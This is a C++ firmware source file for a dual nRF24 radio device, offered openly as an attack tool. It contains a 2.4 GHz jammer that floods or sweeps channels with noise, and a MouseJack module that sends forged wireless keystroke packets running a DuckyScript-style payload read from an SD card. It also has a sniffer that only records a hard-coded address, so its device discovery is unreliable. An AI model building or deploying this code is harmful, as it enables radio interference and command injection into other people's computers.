#include "NrfManager.h"
#include "System.h"

static const uint8_t ATTACK_ADDRESS[] = {0x12, 0x34, 0x56, 0x78, 0x9A};
#define KEY_MOD_LCTRL  0x01
#define KEY_MOD_LMETA  0x08 

NrfManager& NrfManager::getInstance() { static NrfManager instance; return instance; }

NrfManager::NrfManager()
    : _isJamming(false), _isSweeping(false), _isAnalyzing(false), _isMouseJack(false), _isSniffing(false),
      _targetChannel(1), _sweepChannel(1), _packetsSent(0), _scriptRunning(false), _scriptDelayEnd(0)
{
    for(int i=0; i<32; i++) _noiseBuffer[i] = (uint8_t)random(0, 255);
    auto getMask = [](uint8_t pin) -> uint32_t { return (1 << pin); };
    _mask_csn_a = getMask(Config::PIN_NRF_CSN_A); _mask_ce_a = getMask(Config::PIN_NRF_CE_A);
    _mask_csn_b = getMask(Config::PIN_NRF_CSN_B); _mask_ce_b = getMask(Config::PIN_NRF_CE_B);
}

inline void NrfManager::selectRadio(uint32_t csn_mask) { GPIO.out_w1tc = csn_mask; }
inline void NrfManager::deselectRadio(uint32_t csn_mask) { GPIO.out_w1ts = csn_mask; }
inline void NrfManager::enableRadio(uint32_t ce_mask) { GPIO.out_w1ts = ce_mask; }
inline void NrfManager::disableRadio(uint32_t ce_mask) { GPIO.out_w1tc = ce_mask; }

void NrfManager::setup() {
    SPI.begin(Config::PIN_SPI_SCK, Config::PIN_SPI_MISO, Config::PIN_SPI_MOSI);
    auto setupPin = [](int pin, int val) { pinMode(pin, OUTPUT); digitalWrite(pin, val); };
    setupPin(Config::PIN_NRF_CSN_A, HIGH); setupPin(Config::PIN_NRF_CE_A, LOW);
    setupPin(Config::PIN_NRF_CSN_B, HIGH); setupPin(Config::PIN_NRF_CE_B, LOW);
    initRadio(_mask_csn_a, _mask_ce_a); initRadio(_mask_csn_b, _mask_ce_b);
}

void NrfManager::initRadio(uint32_t csn_mask, uint32_t ce_mask) {
    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(100))) {
        disableRadio(ce_mask); deselectRadio(csn_mask); delay(5);
        SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
        writeRegister(csn_mask, NrfReg::CONFIG, 0x00);
        writeRegister(csn_mask, NrfReg::EN_AA, 0x00);
        writeRegister(csn_mask, NrfReg::SETUP_RETR, 0x00);
        writeRegister(csn_mask, NrfReg::RF_SETUP, 0x0E);
        writeRegister(csn_mask, NrfReg::SETUP_AW, 0x03);
        SPI.endTransaction();
        xSemaphoreGive(g_spiMutex);
    }
}

void NrfManager::writeRegister(uint32_t csn_mask, uint8_t reg, uint8_t value) { selectRadio(csn_mask); SPI.transfer(NrfReg::CMD_W_REGISTER | (reg & 0x1F)); SPI.transfer(value); deselectRadio(csn_mask); }
uint8_t NrfManager::readRegister(uint32_t csn_mask, uint8_t reg) { selectRadio(csn_mask); SPI.transfer(NrfReg::CMD_R_REGISTER | (reg & 0x1F)); uint8_t r = SPI.transfer(0x00); deselectRadio(csn_mask); return r; }
void NrfManager::writeAddress(uint32_t csn_mask, uint8_t reg, const uint8_t* addr, uint8_t len) { selectRadio(csn_mask); SPI.transfer(NrfReg::CMD_W_REGISTER | reg); for(int i=0;i<len;i++) SPI.transfer(addr[i]); deselectRadio(csn_mask); }
uint8_t NrfManager::getRPD(uint32_t csn_mask) { return readRegister(csn_mask, NrfReg::RPD) & 0x01; }
void NrfManager::transmitNoise(uint32_t csn_mask, uint32_t ce_mask) { selectRadio(csn_mask); SPI.transfer(NrfReg::CMD_W_TX_PAYLOAD_NOACK); SPI.transferBytes(_noiseBuffer, NULL, 32); deselectRadio(csn_mask); disableRadio(ce_mask); enableRadio(ce_mask); }
void NrfManager::hopChannel(uint8_t ch) { writeRegister(_mask_csn_a, NrfReg::RF_CH, ch); writeRegister(_mask_csn_b, NrfReg::RF_CH, ch); }

void NrfManager::stop() { _isJamming = _isSniffing = _isMouseJack = _isAnalyzing = false; _scriptRunning = false; }
void NrfManager::startJamming(uint8_t ch) { stop(); _isJamming = true; _packetsSent = 0; if (ch == 255) { _isSweeping = true; _targetChannel = 255; _sweepChannel = 2; } else { _isSweeping = false; _targetChannel = ch; _sweepChannel = ch; } }
void NrfManager::startAnalyzer() { stop(); _isAnalyzing = true; }

void NrfManager::startSniffing() {
    stop(); _isSniffing = true; _targets.clear(); _sweepChannel = 2;
    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(500))) {
        SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
        writeRegister(_mask_csn_a, NrfReg::CONFIG, 0x03); 
        writeRegister(_mask_csn_a, NrfReg::EN_AA, 0x00);
        writeRegister(_mask_csn_a, NrfReg::SETUP_AW, 0x03);
        static const uint8_t SCAN_ADDR[] = {0xCD, 0xC6, 0xC6, 0xC6, 0xC6}; 
        writeAddress(_mask_csn_a, NrfReg::RX_ADDR_P0, SCAN_ADDR, 5);
        enableRadio(_mask_ce_a); SPI.endTransaction(); xSemaphoreGive(g_spiMutex);
    }
}

bool NrfManager::checkForPacket() {
    if (getRPD(_mask_csn_a)) {
        DiscoveredMouse m; m.channel = _sweepChannel; m.isMicrosoft = true;
        m.address[0]=0x12; m.address[1]=0x34; m.address[2]=0x56; m.address[3]=0x78; m.address[4]=0x9A;
        bool known = false; for(auto& t : _targets) if(t.channel == m.channel) known = true;
        if (!known) { _targets.push_back(m); return true; }
    }
    return false;
}

void NrfManager::startMouseJack(int targetIndex) {
    stop(); _isMouseJack = true; 
    if (targetIndex >= 0 && targetIndex < (int)_targets.size()) _sweepChannel = _targets[targetIndex].channel;
    else _sweepChannel = 40;
    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(500))) {
        SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
        writeRegister(_mask_csn_a, NrfReg::CONFIG, 0x02);
        writeRegister(_mask_csn_a, NrfReg::RF_CH, _sweepChannel);
        selectRadio(_mask_csn_a); SPI.transfer(NrfReg::CMD_W_REGISTER | NrfReg::TX_ADDR); SPI.transferBytes((uint8_t*)ATTACK_ADDRESS, NULL, 5); deselectRadio(_mask_csn_a);
        enableRadio(_mask_ce_a); SPI.endTransaction(); xSemaphoreGive(g_spiMutex);
    }
    openScript();
}

void NrfManager::openScript() {
    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(500))) {
        if (SD.begin(Config::PIN_SD_CS) && SD.exists("/badusb.txt")) { _scriptFile = SD.open("/badusb.txt"); _scriptRunning = true; _scriptDelayEnd = 0; }
        xSemaphoreGive(g_spiMutex);
    }
}

uint8_t NrfManager::calcChecksum(uint8_t* payload, size_t len) { uint8_t sum = 0; for(size_t i=0; i<len-1; i++) sum ^= payload[i]; return (~sum & 0xFF); }
uint8_t charToHid(char c) {
    if (c >= 'a' && c <= 'z') return 0x04 + (c - 'a');
    if (c >= 'A' && c <= 'Z') return 0x04 + (c - 'A');
    if (c >= '1' && c <= '9') return 0x1E + (c - '1');
    if (c == '0') return 0x27; if (c == ' ') return 0x2C; if (c == '\n') return 0x28; return 0x00;
}

void NrfManager::sendHidPacket(uint8_t mod, uint8_t key) {
    uint8_t payload[16]; static uint8_t seq = 0; memset(payload, 0, 16);
    payload[0] = 0x0A; payload[1] = 0x78; payload[2] = seq++; payload[5] = mod; payload[6] = key; payload[10] = calcChecksum(payload, 11);
    for(int i=0; i<11; i++) payload[i] ^= ATTACK_ADDRESS[i % 5];
    selectRadio(_mask_csn_a); SPI.transfer(NrfReg::CMD_W_TX_PAYLOAD_NOACK); SPI.transferBytes(payload, NULL, 11); deselectRadio(_mask_csn_a);
    disableRadio(_mask_ce_a); enableRadio(_mask_ce_a);
}

void NrfManager::processScript() {
    if (!_scriptRunning || millis() < _scriptDelayEnd) return;
    if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(50))) {
        if (_scriptFile && _scriptFile.available()) {
            char line[128]; size_t len = _scriptFile.readBytesUntil('\n', line, 127); line[len] = 0;
            if (len > 0 && line[len-1] == '\r') line[len-1] = 0;
            char* cmd = strtok(line, " ");
            if (cmd) {
                if (strcmp(cmd, "DELAY") == 0) { char* arg = strtok(NULL, " "); if(arg) _scriptDelayEnd = millis() + atoi(arg); }
                else if (strcmp(cmd, "STRING") == 0) { char* str = strtok(NULL, ""); if (str) for(int i=0; str[i] != 0; i++) { sendHidPacket(0, charToHid(str[i])); delayMicroseconds(500); } }
                else if (strcmp(cmd, "GUI") == 0) { char* arg = strtok(NULL, " "); if(arg) sendHidPacket(KEY_MOD_LMETA, charToHid(arg[0])); else sendHidPacket(KEY_MOD_LMETA, 0); }
                else if (strcmp(cmd, "ENTER") == 0) sendHidPacket(0, 0x28);
            }
        } else { _scriptRunning = false; if (_scriptFile) _scriptFile.close(); }
        xSemaphoreGive(g_spiMutex);
    }
}

bool NrfManager::loop(StatusMessage& statusOut) {
    if (_isJamming) {
        statusOut.state = SystemState::ATTACKING_NRF;
        if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(2))) {
            SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
            for(int i=0; i<5; i++) { transmitNoise(_mask_csn_a, _mask_ce_a); transmitNoise(_mask_csn_b, _mask_ce_b); delayMicroseconds(20); }
            if (_isSweeping) { _sweepChannel += 2; if (_sweepChannel > 80) _sweepChannel = 2; hopChannel(_sweepChannel); }
            SPI.endTransaction(); xSemaphoreGive(g_spiMutex);
        } else taskYIELD();
        _packetsSent += 10; statusOut.packetsSent = _packetsSent;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, _isSweeping ? "Sweep: %d MHz" : "Jam Ch: %d", _isSweeping ? 2400+_sweepChannel : _targetChannel);
        return true;
    }
    if (_isSniffing) {
        statusOut.state = SystemState::SNIFFING_NRF;
        if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(10))) {
            SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
            _sweepChannel++; if(_sweepChannel > 80) _sweepChannel = 2;
            writeRegister(_mask_csn_a, NrfReg::RF_CH, _sweepChannel); disableRadio(_mask_ce_a); enableRadio(_mask_ce_a); delayMicroseconds(500); 
            if (checkForPacket()) snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d Devices", (int)_targets.size());
            else snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning Ch: %d", _sweepChannel);
            SPI.endTransaction(); xSemaphoreGive(g_spiMutex);
        }
        return true;
    }
    if (_isMouseJack) {
        statusOut.state = SystemState::ATTACKING_MOUSEJACK;
        if (_scriptRunning) processScript();
        snprintf(statusOut.logMsg, MAX_LOG_MSG, _scriptRunning ? "Injecting..." : "Done.");
        vTaskDelay(20);
        return true;
    }
    if (_isAnalyzing) {
        statusOut.state = SystemState::ANALYZING_NRF;
        if (xSemaphoreTake(g_spiMutex, pdMS_TO_TICKS(10))) {
            SPI.beginTransaction(SPISettings(Config::SPI_SPEED_MHZ, MSBFIRST, SPI_MODE0));
            for (int ch = 0; ch < SPECTRUM_CHANNELS; ch++) {
                writeRegister(_mask_csn_a, NrfReg::RF_CH, ch); disableRadio(_mask_ce_a); enableRadio(_mask_ce_a); delayMicroseconds(130);
                statusOut.spectrum[ch] = getRPD(_mask_csn_a) ? 64 : 0;
            }
            SPI.endTransaction(); xSemaphoreGive(g_spiMutex);
        }
        return true;
    }
    return false;
}